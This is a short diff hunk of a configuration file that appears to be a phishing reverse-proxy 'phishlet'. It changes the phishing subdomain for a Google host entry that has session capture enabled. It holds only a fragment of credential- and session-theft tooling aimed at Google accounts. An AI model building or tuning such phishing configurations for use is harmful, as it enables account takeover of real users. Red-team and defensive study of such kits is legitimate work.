@@ -10,7 +10,7 @@ proxy_hosts:
       is_landing: true,
     }
   - {
-      phish_sub: "www",
+      phish_sub: "www4",
       orig_sub: "www",
       domain: "google.com",
       session: true,
